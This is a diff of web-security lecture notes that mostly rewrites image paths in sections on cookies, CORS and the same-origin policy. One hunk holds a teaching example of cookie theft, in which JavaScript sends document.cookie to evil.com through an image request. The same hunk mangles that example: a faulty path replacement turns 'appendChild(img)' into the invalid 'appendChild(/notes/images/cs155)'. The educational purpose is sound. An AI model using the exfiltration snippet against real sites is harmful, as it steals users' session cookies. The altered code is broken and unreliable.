@@ -22,7 +22,7 @@
     - Stateless protocol beyond a single request and response
 * Every request has a uniform resource location (URL)
 
-![URL](img/2022-04-18-url.png)
+![URL](/notes/images/cs155/2022-04-18-url.png)
 
 * Request looks like
 
@@ -110,7 +110,7 @@
     Cookie: userID=F3D947C2
     ```
 * Example: session involving login
-    ![Login with cookies](img/2022-04-18-login-cookies.png)
+    ![Login with cookies](/notes/images/cs155/2022-04-18-login-cookies.png)
 * Websites of the same origin have access to each other's cookies, even if opened in different tabs
 * Cookies set by a domain are always sent for any request to that domain
     - Includes subrequests made by a different domain
@@ -203,9 +203,9 @@
             2. If sending data, content type is `application/x-www-form-urlencoded` or `multipart/form-data` or `text/plain`
             3. No custom HTTP headers, only some standardized ones
     - Example: CORS success
-        ![CORS success](img/2022-04-18-cors-success.png)
+        ![CORS success](/notes/images/cs155/2022-04-18-cors-success.png)
     - Example: CORS failure
-        ![CORS failure](img/2022-04-18-cors-failure.png)
+        ![CORS failure](/notes/images/cs155/2022-04-18-cors-failure.png)
 
 ### Same-Origin Policy for Cookies
 
@@ -244,7 +244,7 @@
     ```js
     const img = document.createElement("image");
     img.src = "https://evil.com/?cookies=" + document.cookie;
-    document.body.appendChild(img);
+    document.body.appendChild(/notes/images/cs155);
     ```
 * To prevent: HttpOnly Cookies - setting to prevent cookies from being accessed by `document.cookie` API
     - Never sent by browser because `(google.com, /)` does not match `(bank.com, /)`
